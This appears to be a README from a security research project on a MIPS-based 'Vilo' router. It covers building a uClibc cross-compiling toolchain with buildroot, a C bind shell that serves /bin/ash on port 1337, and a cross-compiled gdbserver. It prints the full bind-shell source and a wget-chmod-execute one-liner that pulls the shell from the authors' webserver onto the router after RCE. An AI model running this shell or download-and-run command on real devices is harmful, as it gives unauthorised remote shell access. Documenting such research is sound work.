# MIPS Binary Compilation
The output for the `file` command on compiled binaries like `hlRouterApp` is:

```
hlRouterApp: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, no section header
```

This means these binaries contain 32-bit, little endian MIPS assembly (rel2 specifically) using `uClibc` as their library and not `Glibc`. To create our own binaries that can run on this architecture, we will have to cross-compile for the MIPS architecture using the [uClibc](https://www.uclibc.org/) [toolchain](https://buildroot.org/). 

## Building the uClibc Toolchain
Note that I followed the directions from [here](https://www.uclibc.org/toolchains.html). Download the latest version of `buildroot` from https://buildroot.org/download.html and extract the compressed file (for demonstration purposes, I downloaded and extracted mine to `/opt/buildroot`). Go into that directory and run `make menuconfig` to configure the environment for the proper toolchain:

* Target Options -> Target Architecture = `MIPS (little endian)`
* Target Options -> Target Archtiecture Variant = `Generic MIPS32R2`
* Toolchain -> C library = `uClibc-ng` (technically `uClibc-ng` is different than `uClibc`, but it still seems to mostly work)
* Toolchain -> Kernel Headers = `Linux 4.14.x kernel headers` (I chose the oldest one that didn't require I attach headers myself)
* Save (DON'T FORGET THIS)

At this point, run `make` (and install any missing dependencies). This will take a while, but once it's done you should have everything you need in `/opt/buildroot/output/host/bin`. Just to explain, what this means is the `./mipsel-buildroot-linux-uclibc-gcc` binary in that directory can run on your x86 machine, but when invoked will create MIPS32 binaries that will run on the Vilo router (utilizing the uClibc library). 

## Compiling a Bind Shell
We used a vulnerability we found to get RCE on the device, but we wanted a more stable shell that we could connect to over the network to simplify access. We just modified some C code we found online to create [`shell.c`](./compilation/shell.c):

```c
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main() {
    int resultfd, sockfd;
    int port = 1337;
    struct sockaddr_in my_addr;
    
    // sycall socketcall (sys_socket 1)
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // syscall socketcall (sys_setsockopt 14)
    int one = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    // set struct values
    my_addr.sin_family = AF_INET; // 2
    my_addr.sin_port = htons(port); // port number
    my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

    // syscall socketcall (sys_bind 2)
    puts("Binding to socket...");
    bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

    // syscall socketcall (sys_listen 4)
    listen(sockfd, 0);
    puts("Waiting for connection");

    // syscall socketcall (sys_accept 5)
    resultfd = accept(sockfd, NULL, NULL);
    puts("Accepted a connection");

    // syscall 63
    dup2(resultfd, 2);
    dup2(resultfd, 1);
    dup2(resultfd, 0);
    puts("If you see this, you're in the shell!");

    system("/bin/ash");

    return 0;
}
```

When this code is compiled and ran, a socket will listen on port 1337 and the first person to connect will have a `/bin/ash` shell available to them. We could probably have made a nicer one that give full TTY, allow multiple people to access simultaneously, and not require restarting the binary once the first person disconnects form the shell, but we're lazy. 

The file was compiled as follows:
```bash
root@cc85a8908127:/opt/buildroot/output/host/bin$ ./mipsel-buildroot-linux-uclibc-gcc -o shell shell.c
root@cc85a8908127:/opt/buildroot/output/host/bin$ file shell
shell: ELF 32-bit LSB pie executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, not stripped
```

Note that most code online uses `execve("/bin/sh", NULL, NULL)` instead of `system("/bin/sh")`. We tried that and it kept segfaulting, and it wasn't until later that we learned that the **second argument can't be NULL**, it must contain the actual arguments. `env` can be NULL, however.

The compiled binary `shell` is [attached here](./compilation/shell). To get this binary on the box, we simply hosted a public webserver serving this file and used the built-in BusyBox `wget` command to download it - `wget http://<IP>/shell -O /tmp/s && chmod 777 /tmp/s && /tmp/s`. 

## Compiling `gdbserver`
To help us debug some pwn exploits, we wanted to compile `gdbserver` so it would run on the box and expose a debugging socket for us to connect to. This required building `gdbserver` from scratch using the toolchain we built before (following fantastic instructions [here](https://sourceware.org/gdb/wiki/BuildingCrossGDBandGDBserver)). We cloned the GDB repository using `git clone git://sourceware.org/git/binutils-gdb.git gdb`. To ensure building `gdbserver` used our uClibc toolchain, we ran the following commands:

```bash
export PATH=/opt/buildroot/output/host/bin:$PATH
export TARGET=mipsel-buildroot-linux-uclibc
```

The uClibc toolchain is old enough that the latest version of GDB can't be built using it due to some dependency requirements. Instead, we compiled `gdbserver` using GDB v7.11. All the commands we ran are listed below:

```bash
cd /opt/gdb
git checkout tags/gdb-7.11-branchpoint
cd /opt/gdb/gdb/gdbserver
./configure --target=$TARGET
make
make install DESTDIR=/tmp
cp /tmp/usr/local/bin/gdbserver /opt/gdbserver
```

And now the `gdbserver` executable is ready to run and located in `/opt`! It's also included in this repository [here](./compilation/gdbserver).

*Note - this executable runs fine on the router until some connects to the remote port to debug, then it segfaults. We're not sure why (maybe because it's an older version of `gdbserver`? Perhaps because it wasn't compiled with the exact kernel version, or is using uClibc-ng?)*